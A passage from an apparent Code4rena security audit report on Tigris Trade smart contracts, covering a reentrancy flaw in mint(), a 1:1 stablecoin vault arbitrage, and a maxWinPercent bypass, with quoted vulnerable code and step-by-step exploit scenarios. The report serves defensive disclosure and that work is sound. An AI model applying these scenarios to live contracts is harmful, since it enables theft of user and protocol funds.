using <code>addToPosition</code> can cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1407511530\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"h-07-reentrancy-attack-during-mint-function-in-position-contract-which-can-lead-to-removing-of-the-other-users-limit-orders-or-stealing-contract-funds-because-initid-is-set-low-value\" style=\"position:relative;\"><a href=\"#h-07-reentrancy-attack-during-mint-function-in-position-contract-which-can-lead-to-removing-of-the-other-users-limit-orders-or-stealing-contract-funds-because-initid-is-set-low-value\" aria-label=\"h 07 reentrancy attack during mint function in position contract which can lead to removing of the other users limit orders or stealing contract funds because initid is set low value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/400\">[H-07] reentrancy attack during <code>mint()</code> function in Position contract which can lead to removing of the other user’s limit orders or stealing contract funds because initId is set low value</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/400\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/539\">wait</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/489\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/459\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/451\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/357\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/288\">mookimgo</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/186\">debo</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/90\">stealthyz</a></em></p>\n<p>Function <code>Position.mint()</code> has been used in <code>initiateLimitOrder()</code> and <code>initiateMarketOrder()</code> and it doesn’t follow check-effect-interaction pattern and code updates the values of <code>_limitOrders</code>, <code>initId</code>, <code>_openPositions</code> and <code>position _tokenIds</code> variables after making external call by using <code>safeMint()</code>. This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass <code>_checkDelay()</code> checks. Attacker can perform this action:</p>\n<ol>\n<li>Call <code>initiateLimitOrder()</code> and create limit order with id equal to ID1 reenter (while <code>_limitOrders</code> for ID1 is not yet settled) with <code>cancelLimitOrder(ID1)</code> (no <code>checkDelay()</code> check) and remove other users limit orders because code would try to remove <code>_limitOrderIndexes[_asset][ID1]</code> position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the <code>Position.burn()</code> code.</li>\n<li>Call <code>initiateMarketOrder()</code> and create a position with ID1 and while <code>initId[ID1]</code> has not yet settled reenter the Trading with <code>addToPosition(ID1)</code> function (bypass <code>checkDelay()</code> because both action is opening) and increase the position size which would set <code>initId[ID1]</code> according to new position values but then when code execution returns to rest of <code>mint()</code> logic <code>initId[ID1]</code> would set by initial values of the positions which is very lower than what it should be and <code>initId[ID1]</code> has been used for calculating <code>accuredInterest</code> of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.</li>\n</ol>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>mint()</code> code in Position contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mint(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MintTrade memory _mintTrade</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external onlyMinter {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint newTokenID = _tokenIds.current();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Trade storage newTrade = _trades[newTokenID];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.margin = _mintTrade.margin;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.leverage = _mintTrade.leverage;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.asset = _mintTrade.asset;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.direction = _mintTrade.direction;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.price = _mintTrade.price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.tpPrice = _mintTrade.tp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.slPrice = _mintTrade.sl;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.orderType = _mintTrade.orderType;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.id = newTokenID;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        newTrade.tigAsset = _mintTrade.tigAsset;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_mintTrade.orderType &gt; 0) { // update the values of some storage functions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _limitOrders[_mintTrade.asset].push(newTokenID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _openPositions.push(newTokenID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _openPositionsIndexes[newTokenID] = _openPositions.length-1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _assetOpenPositions[_mintTrade.asset].push(newTokenID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _tokenIds.increment();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see by calling <code>_safeMint()</code>, code would make external call to <code>onERC721Received()</code> function of the account address and the code sets the values for <code>_limitOrders[]</code>, <code>_limitOrderIndexes[]</code>, <code>initId[]</code>, <code>_openPositions[]</code>, <code>_openPositionsIndexes[]</code>, <code>_assetOpenPositions[]</code>, <code>_assetOpenPositionsIndexes[]</code> and <code>_tokenIds</code>. So code doesn’t follow check-effect-interaction pattern and it’s possible to perform reentrancy attack.</p>\n<p>There could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:</p>\n<p><strong>Scenario #1 where attacker removes other users limit orders and create broken storage state</strong></p>\n<ol>\n<li>Attacker contract would call <code>initiateLimitOrder()</code> and code would create the limit order and mint it in the <code>Position._safeMint()</code> with ID1.</li>\n<li>Then code would call attacker address in <code>_safeMint()</code> function because of the <code>onERC721Received()</code> call check.</li>\n<li>Variables <code>_limitOrders[]</code>, <code>_limitOrderIndexes[ID1]</code> are not yet updated for ID1 and <code>_limitOrderIndexes[ID1]</code> is 0x0 and ID1 is not in <code>_limitOrder[]</code> list.</li>\n<li>Attacker contract would reenter the Trading contract by calling <code>cancelLimitOrder(ID1)</code>.</li>\n<li><code>cancelLimitOrder()</code> checks would pass and would try to call <code>Position.burn(ID1)</code>.</li>\n<li><code>burn()</code> function would try to remove ID1 from <code>_limitOrders[]</code> list but because <code>_limitOrderIndexes[ID1]</code> is 0, the code would remove the 0 index limit order which belongs to another user.</li>\n<li>Execution would return to <code>Position.mint()</code> logic and code would add burned id token to <code>_limitOrder[]</code> list.</li>\n</ol>\n<p>So there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.</p>\n<p><strong>Scenario #2 where attacker steal contract/users funds by wrong profit calculation</strong></p>\n<ol>\n<li>Attacker’s contract would call <code>initiateMarketOrder(lowMargin)</code> to create position with ID1 while the margin is low.</li>\n<li>Code would mint position token for attacker and in <code>_safeMint()</code> would make external call and call <code>onERC721Received()</code> function of attacker address.</li>\n<li>The value of <code>initId[ID1]</code> is not yet set for ID1.</li>\n<li>Attacker contract would call <code>addToPosition(ID1, bigMargin)</code> to increase the margin of the position the <code>_checkDelay()</code> check would pass because both actions are opening position.</li>\n<li>Code would increase the margin of the position and set the value of the <code>initId[ID1]</code> by calling <code>position.addToPosition()</code> and the value would be based on the <code>newMargin</code>.</li>\n<li>The execution flow would receive the rest of <code>Position.mint()</code> function and code would set <code>initId[ID1]</code> based on old margin value.</li>\n<li>Then the value of <code>initId[ID1]</code> for attacker position would be very low, which would cause <code>accInterest</code> to be higher than it’s supposed to be for position(in <code>Position.trades()</code> function calculations ) and would cause <code>_payout</code> value to be very high (in <code>pnl()</code> function’s calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.</li>\n</ol>\n<p>So attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.</p>\n<p>There can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.</p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Follow the check-effect-interaction pattern.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/400\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1383811250\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to other CEI reports, this report shows how control can be gained in the middle of the mint execution to create an inconsistent state.</p>\n<p>The warden has shown how, because <code>mint</code> doesn’t follow CEI conventions, by reEntering via safeMint, an attacker can manipulate the state of limit orders, and also benefit by changing profit calculations.</p>\n<p>Because the finding shows how to break invariants and profit from it, I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/400#issuecomment-1407764413\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175911</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"h-08-incorrect-assumption-of-stablecoin-market-stability\" style=\"position:relative;\"><a href=\"#h-08-incorrect-assumption-of-stablecoin-market-stability\" aria-label=\"h 08 incorrect assumption of stablecoin market stability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/462\">[H-08] Incorrect Assumption of Stablecoin Market Stability</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/462\">0xsomeone</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/496\">Critical</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/397\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/384\">Tointer</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/243\">Secureverse</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/227\">SamGMK</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/214\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/210\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/203\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/155\">Ruhum</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/151\">aviggiano</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>StableVault</code> contract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.</p>\n<p>This is at minimum a medium-severity vulnerability as the balance sheet of the <code>StableVault</code> will consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such as <a href=\"https://curve.fi/#/ethereum/pools/3pool/deposit\">Curve</a> as well as the <a href=\"https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd\">Chainlink oracle reported prices themselves</a>.</p>\n<p>Given that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at <code>0.99994853</code> USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at <code>1.00000000</code> USD) acquiring an arbitrage in the price by selling the traded asset.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>To illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed to <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51\">invoke <code>deposit</code></a> with your USDC asset and retrieve your <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72\">incorrectly calculated <code>USDT</code> equivalent via <code>withdraw</code></a>.</p>\n<p>The arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquired <code>USDT</code> for <code>USDC</code> on the stablecoin pair we assessed earlier, ultimately ending up with a greater amount of <code>USDC</code> than we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.</p>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p><a href=\"https://data.chain.link/popular\">Chainlink oracle resources</a></p>\n<p><a href=\"https://curve.fi/#/ethereum/pools\">Curve Finance pools</a></p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We advise the <code>StableVault</code> to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their “neutral” USD price rather than their subjective on-chain price or equality assumption.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1359639245\">Alex the Entreprenerd (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to an incorrect assumption, the system offers infinite leverage.</p>\n<p>This can be trivially exploited by arbitraging with any already available exchange.</p>\n<p>Depositors will incur a loss equal to the size of the arbitrage as the contract is always taking the losing side.</p>\n<p>I believe this should be High because of it’s consistently losing nature.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1377373227\">TriHaz (Tigris Trade) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We are aware of this issue, we will keep the vault with one token for now.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-09-users-can-bypass-the-maxwinpercent-limit-using-a-partially-closing\" style=\"position:relative;\"><a href=\"#h-09-users-can-bypass-the-maxwinpercent-limit-using-a-partially-closing\" aria-label=\"h 09 users can bypass the maxwinpercent limit using a partially closing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/507\">[H-09] Users can bypass the <code>maxWinPercent</code> limit using a partially closing</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/507\">hansfriese</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/487\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/339\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/332\">bin2chen</a></em></p>\n<p>Users can bypass the <code>maxWinPercent</code> limit using a partial closing.</p>\n<p>As a result, users can receive more funds than their upper limit from the protocol.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As we can see from the <a href=\"https://docs.tigris.trade/protocol/trading-and-fees#limitations\">documentation</a>, there is limitation of a maximum PnL.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Maximum PnL is +500%. The trade won&#39;t be closed unless the user sets a Take Profit order or closes the position manually.</span></span></code></pre>\n<p>And this logic was implemented like below in <code>_closePosition()</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2022</span><span class=\"mtk1\">-</span><span class=\"mtk7\">12</span><span class=\"mtk1\">-</span><span class=\"mtk12\">tigris</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">624</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleCloseFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_payout</span><span class=\"mtk1\">)*</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_isBot</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">625</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">//@audit bypass limit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">626</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span 